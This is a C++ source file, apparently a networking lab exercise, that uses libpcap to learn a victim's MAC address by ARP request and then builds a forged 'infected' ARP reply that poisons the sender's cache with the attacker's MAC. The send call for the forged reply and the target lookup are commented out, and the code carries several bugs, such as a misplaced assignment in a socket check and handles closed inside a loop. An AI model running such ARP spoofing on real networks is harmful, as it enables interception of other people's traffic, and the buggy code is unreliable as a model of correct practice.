#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>


typedef struct _Ethernet{
	unsigned char dst_MAC[6];
	unsigned char src_MAC[6];
	unsigned int Type;
}Ethernet;

typedef struct _Arp{
	unsigned int hw_Type;
	unsigned int proto_Type;
	unsigned char hw_Len;
	unsigned char proto_Len;
	unsigned int operation;
	unsigned char src_HW[6];
	unsigned char src_Proto[4];
	unsigned char tar_HW[6];
	unsigned char tar_Proto[4];
}Arp;


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

struct ifreq *getMAC(char *name){
	int sock;
	struct ifreq *ifr = (struct ifreq*)malloc(sizeof(struct ifreq));
	int fd;
	memset(ifr,0x00,sizeof(struct ifreq));
	strcpy(ifr->ifr_name,name);

	fd = socket(AF_INET,SOCK_STREAM,0);

	if(sock=socket(AF_INET, SOCK_STREAM,0)<0){
		printf("Socket erron\n");
		return ifr;
	}
	if(ioctl(fd,SIOCGIFHWADDR,ifr) < 0){
		printf("ioctl error\n");
		return ifr;
	}
	close(sock);

	return ifr;
}

char *getIP(char *name){
	int sock;
	struct ifreq ifr;
	char *ipstr = (char*)malloc(40);	
	sock = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, name, IFNAMSIZ);

	if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
		printf("Socket Error");
	} 
	else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
				ipstr,sizeof(struct sockaddr));
	}

	return ipstr;

}


int main(int argc, char* argv[]) {


	char sender_MAC[20];
	char target_MAC[20];

	//Find my MAC address
	struct ifreq * ifr = getMAC(argv[1]);
	unsigned char *mymac= (unsigned char*) ifr->ifr_hwaddr.sa_data;
	printf("%s : %02x:%02x:%02x:%02x:%02x:%02x\n",ifr->ifr_name,mymac[0],mymac[1],mymac[2],mymac[3],mymac[4],mymac[5]);

	//Find my IP address
	
	char* myIP =getIP(argv[1]);

	//Send ARP request to get sender MAC address
	for(int idx=2;idx<argc;idx+=2){
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");

	char myMAC[20];
	sprintf(myMAC,"%02x:%02x:%02x:%02x:%02x:%02x",mymac[0],mymac[1],mymac[2],mymac[3],mymac[4],mymac[5]);


	packet.eth_.smac_ = Mac(myMAC);
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(myMAC);
	packet.arp_.sip_ = htonl(Ip(myIP));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[idx]));


	//Make child process
	pid_t pid = fork();
	if(pid==0){
		sleep(1);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
		pcap_close(handle);
		free(ifr);
		return 0;
	}
	
	pcap_close(handle);

	pcap_t* pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
		return -1;
	}
	

	//Receive ARP reply packet from sender
	
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		
		Ethernet neth;
		for(int i=0;i<6;i++){
			neth.dst_MAC[i]=packet[i];
		}
		for(int i=6;i<12;i++){
			neth.src_MAC[i-6]=packet[i];
		}
		neth.Type=packet[12]<<8|packet[13];
		if(neth.Type!=0x0806)
			continue;

	
		Arp narp;
		narp.hw_Type=packet[14]<<8|packet[15];
		narp.proto_Type=packet[16]<<8|packet[17];
		narp.hw_Len=packet[18];
		narp.proto_Len=packet[19];
		narp.operation = packet[20]<<8|packet[21];
		for (int i=0;i<6;i++)
			narp.src_HW[i]=packet[22+i];
		for(int i=0;i<4;i++)
			narp.src_Proto[i]=packet[28+i];
		for(int i=0;i<6;i++)
			narp.tar_HW[i]=packet[32+i];
		for(int i=0;i<4;i++)
			narp.tar_Proto[i]=packet[38+i];
		//printf("Victim MAC : %02x:%02x:%02x:%02x:%02x:%02x\n",narp.src_HW[0],narp.src_HW[1],narp.src_HW[2],narp.src_HW[3],narp.src_HW[4],narp.src_HW[5]);
	

		if(narp.proto_Type!=0x0800 ||narp.operation!=0x0002)
			continue;
		char srcIP[20];
		sprintf(srcIP,"%u.%u.%u.%u",narp.src_Proto[0],narp.src_Proto[1],narp.src_Proto[2],narp.src_Proto[3]);
		char tarIP[20];
		sprintf(tarIP,"%u.%u.%u.%u",narp.tar_Proto[0],narp.tar_Proto[1],narp.tar_Proto[2],narp.tar_Proto[3]);

		
		//If arp reply is mine
		if(Ip(srcIP)==Ip(argv[idx]) &&Ip(tarIP)==Ip(myIP)){	       
		sprintf(sender_MAC,"%02x:%02x:%02x:%02x:%02x:%02x",narp.src_HW[0],narp.src_HW[1],narp.src_HW[2],narp.src_HW[3],narp.src_HW[4],narp.src_HW[5]);
		break;
		}
		pcap_close(pcap);	
	}

	

/*
	//Send ARP request to get target MAC address
	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket tpacket;

	tpacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	
	tpacket.eth_.smac_ = Mac(myMAC);
	tpacket.eth_.type_ = htons(EthHdr::Arp);
	tpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	tpacket.arp_.pro_ = htons(EthHdr::Ip4);
	tpacket.arp_.hln_ = Mac::SIZE;
	tpacket.arp_.pln_ = Ip::SIZE;
	tpacket.arp_.op_ = htons(ArpHdr::Request);
	tpacket.arp_.smac_ = Mac(myMAC);
	tpacket.arp_.sip_ = htonl(Ip(myIP));
	tpacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
	tpacket.arp_.tip_ = htonl(Ip(argv[idx+1]));

	
	pid_t pid2 = fork();
	if(pid2==0){
		sleep(1);
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&tpacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
		pcap_close(handle);
		free(ifr);
		return 0;
	}
	pcap_close(handle);

	pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
		return -1;
	}
	

	
	//Receive ARP reply packet from target
	
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		
		Ethernet neth;
		for(int i=0;i<6;i++){
			neth.dst_MAC[i]=packet[i];
		}
		for(int i=6;i<12;i++){
			neth.src_MAC[i-6]=packet[i];
		}
		neth.Type=packet[12]<<8|packet[13];
		if(neth.Type!=0x0806)
			continue;

		
		Arp narp;
		narp.hw_Type=packet[14]<<8|packet[15];
		narp.proto_Type=packet[16]<<8|packet[17];
		narp.hw_Len=packet[18];
		narp.proto_Len=packet[19];
		narp.operation = packet[20]<<8|packet[21];
		for (int i=0;i<6;i++)
			narp.src_HW[i]=packet[22+i];
		for(int i=0;i<4;i++)
			narp.src_Proto[i]=packet[28+i];
		for(int i=0;i<6;i++)
			narp.tar_HW[i]=packet[32+i];
		for(int i=0;i<4;i++)
			narp.tar_Proto[i]=packet[38+i];	
		if(narp.proto_Type!=0x0800 ||narp.operation!=0x0002)
			continue;
		char srcIP[20];
		sprintf(srcIP,"%u.%u.%u.%u",narp.src_Proto[0],narp.src_Proto[1],narp.src_Proto[2],narp.src_Proto[3]);
		char tarIP[20];
		sprintf(tarIP,"%u.%u.%u.%u",narp.tar_Proto[0],narp.tar_Proto[1],narp.tar_Proto[2],narp.tar_Proto[3]);

		
		//If arp reply is mine
		if(Ip(srcIP)==Ip(argv[idx+1]) &&Ip(tarIP)==Ip(myIP)){    
			sprintf(target_MAC,"%02x:%02x:%02x:%02x:%02x:%02x",narp.src_HW[0],narp.src_HW[1],narp.src_HW[2],narp.src_HW[3],narp.src_HW[4],narp.src_HW[5]);
			break;
		}
		pcap_close(pcap);	
	}
	*/
	printf("My MAC:%s\n",myMAC);
	//printf("%s\n%s\n",sender_MAC,target_MAC);


	//Send infected ARP request to sender	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket ipacket;

	ipacket.eth_.dmac_ = Mac(sender_MAC);
	ipacket.eth_.smac_ = Mac(myMAC);
	ipacket.eth_.type_ = htons(EthHdr::Arp);
	ipacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	ipacket.arp_.pro_ = htons(EthHdr::Ip4);
	ipacket.arp_.hln_ = Mac::SIZE;
	ipacket.arp_.pln_ = Ip::SIZE;
	ipacket.arp_.op_ = htons(ArpHdr::Reply);
	ipacket.arp_.smac_ = Mac(myMAC);
	ipacket.arp_.sip_ = htonl(Ip(argv[idx+1]));
	ipacket.arp_.tmac_ = Mac(sender_MAC);
	ipacket.arp_.tip_ = htonl(Ip(argv[idx]));

	/*
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ipacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	*/
	pcap_close(handle);
	}
	
	free(ifr);
}
